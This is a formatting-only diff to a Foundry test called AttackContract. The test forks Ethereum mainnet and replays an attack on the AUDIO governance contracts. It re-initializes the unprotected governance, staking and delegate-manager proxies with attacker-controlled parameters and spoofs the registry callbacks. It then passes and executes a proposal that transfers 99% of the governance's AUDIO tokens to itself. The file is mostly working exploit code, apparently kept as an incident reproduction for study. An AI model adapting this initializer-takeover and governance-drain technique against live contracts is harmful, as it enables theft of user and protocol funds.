@@ -39,19 +39,53 @@ address constant staking = 0xe6D97B2099F142513be7A2a068bE040656Ae4591;
 address constant delegatemanager = 0x4d7968ebfD390D5E7926Cb3587C39eFf2F9FB225;
 
 interface IGovernence {
-    enum Vote { None, No, Yes }
-    enum Outcome { InProgress, Rejected, ApprovedExecuted, QuorumNotMet, ApprovedExecutionFailed, Evaluating, Vetoed, TargetContractAddressChanged, TargetContractCodeHashChanged }
-    function initialize(address _registryAddress, uint256 _votingPeriod, uint256 _executionDelay, uint256 _votingQuorumPercent, uint16 _maxInProgressProposals, address _guardianAddress) external;
+    enum Vote {
+        None,
+        No,
+        Yes
+    }
+    enum Outcome {
+        InProgress,
+        Rejected,
+        ApprovedExecuted,
+        QuorumNotMet,
+        ApprovedExecutionFailed,
+        Evaluating,
+        Vetoed,
+        TargetContractAddressChanged,
+        TargetContractCodeHashChanged
+    }
+
+    function initialize(
+        address _registryAddress,
+        uint256 _votingPeriod,
+        uint256 _executionDelay,
+        uint256 _votingQuorumPercent,
+        uint16 _maxInProgressProposals,
+        address _guardianAddress
+    ) external;
     function evaluateProposalOutcome(uint256 _proposalId) external returns (Outcome);
-    function submitProposal(bytes32 _targetContractRegistryKey, uint256 _callValue, string calldata _functionSignature, bytes calldata _callData, string calldata _name, string calldata _description) external returns (uint256);
+    function submitProposal(
+        bytes32 _targetContractRegistryKey,
+        uint256 _callValue,
+        string calldata _functionSignature,
+        bytes calldata _callData,
+        string calldata _name,
+        string calldata _description
+    ) external returns (uint256);
     function submitVote(uint256 _proposalId, Vote _vote) external;
 }
 
 interface IStaking {
     function initialize(address _tokenAddress, address _governanceAddress) external;
 }
+
 interface IDelegateManagerV2 {
-    function initialize(address _tokenAddress, address _governanceAddress, uint256 _undelegateLockupDuration) external;
+    function initialize(
+        address _tokenAddress,
+        address _governanceAddress,
+        uint256 _undelegateLockupDuration
+    ) external;
     function setServiceProviderFactoryAddress(address _spFactory) external;
     function delegateStake(address _targetSP, uint256 _amount) external returns (uint256);
 }
@@ -61,7 +95,7 @@ contract AttackContract is Test {
     address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
 
     function setUp() public {
-        cheat.createSelectFork("mainnet", 15201793);    // Fork mainnet at block 15201793
+        cheat.createSelectFork("mainnet", 15_201_793); // Fork mainnet at block 15201793
         cheat.label(AUDIO, "AUDIO");
         cheat.label(uniswap, "UniswapV2Router02");
         cheat.label(governance, "GovernanceProxy");
@@ -79,20 +113,20 @@ contract AttackContract is Test {
         console.log("-> executionDelay : 0 block");
         console.log("-> guardianAddress : self");
         // function initialize(
-            // address _registryAddress,
-            // uint256 _votingPeriod,
-            // uint256 _executionDelay,
-            // uint256 _votingQuorumPercent,
-            // uint16 _maxInProgressProposals,
-            // address _guardianAddress
+        // address _registryAddress,
+        // uint256 _votingPeriod,
+        // uint256 _executionDelay,
+        // uint256 _votingQuorumPercent,
+        // uint16 _maxInProgressProposals,
+        // address _guardianAddress
         // )
         IGovernence(governance).initialize(address(this), 3, 0, 1, 4, address(this));
-        
+
         console.log("Evaluate Proposal..."); // this is to make sure one can submit new proposals
-        IGovernence(governance).evaluateProposalOutcome(84);    // callback this.getContract()
-        
+        IGovernence(governance).evaluateProposalOutcome(84); // callback this.getContract()
+
         uint256 audioBalance_gov = IERC20(AUDIO).balanceOf(governance);
-        uint256 stealAmount = audioBalance_gov * 99 / 1e2;   // Steal 99% of AUDIO Token from governance address
+        uint256 stealAmount = audioBalance_gov * 99 / 1e2; // Steal 99% of AUDIO Token from governance address
 
         console.log("Submit Proposal...");
         // function submitProposal(
@@ -103,7 +137,14 @@ contract AttackContract is Test {
         //     string calldata _name,
         //     string calldata _description
         // ) external returns (uint256)
-        IGovernence(governance).submitProposal(bytes32(uint(3078)), 0, "transfer(address,uint256)", abi.encode(address(this), stealAmount), "Hello", "World");
+        IGovernence(governance).submitProposal(
+            bytes32(uint256(3078)),
+            0,
+            "transfer(address,uint256)",
+            abi.encode(address(this), stealAmount),
+            "Hello",
+            "World"
+        );
 
         IStaking(staking).initialize(address(this), address(this));
         IDelegateManagerV2(delegatemanager).initialize(address(this), address(this), 1);
@@ -112,13 +153,13 @@ contract AttackContract is Test {
 
         console.log("-------------------- Tx2 --------------------");
         console.log("SubmitVote `Yes` for malicious ProposalId 85...");
-        cheat.roll(15201795);
-        IGovernence(governance).submitVote(85, IGovernence.Vote(2));    // Voting Yes
+        cheat.roll(15_201_795);
+        IGovernence(governance).submitVote(85, IGovernence.Vote(2)); // Voting Yes
 
         console.log("-------------------- Tx3 --------------------");
         console.log("Execute malicious ProposalId 85...");
-        cheat.roll(15201798);
-        IGovernence(governance).evaluateProposalOutcome(85);    // callback this.getContract()
+        cheat.roll(15_201_798);
+        IGovernence(governance).evaluateProposalOutcome(85); // callback this.getContract()
         uint256 audioBalance_this = IERC20(AUDIO).balanceOf(address(this));
         emit log_named_decimal_uint("AttackContract AUDIO Balance", audioBalance_this, 18);
 
@@ -132,16 +173,30 @@ contract AttackContract is Test {
 
         console.log("-------------------- End --------------------");
         emit log_named_decimal_uint("Attacker ETH Balance", attacker.balance, 18);
-
     }
 
     /* Tx1 callback functions */
-    function getContract(bytes32 _targetContractRegistryKey) external returns(address) { return AUDIO; }
-    function isGovernanceAddress() external view returns(bool) { return true; }
-    function getExecutionDelay() external view returns(uint) { return 0; }
-    function getVotingPeriod() external view returns(uint) { return 0; }
-    function transferFrom(address, address, uint256) external pure returns(bool) { return true; }
+    function getContract(bytes32 _targetContractRegistryKey) external returns (address) {
+        return AUDIO;
+    }
+
+    function isGovernanceAddress() external view returns (bool) {
+        return true;
+    }
+
+    function getExecutionDelay() external view returns (uint256) {
+        return 0;
+    }
+
+    function getVotingPeriod() external view returns (uint256) {
+        return 0;
+    }
+
+    function transferFrom(address, address, uint256) external pure returns (bool) {
+        return true;
+    }
+
     function validateAccountStakeBalance(address) external pure {}
 
-  receive() external payable {}
+    receive() external payable {}
 }
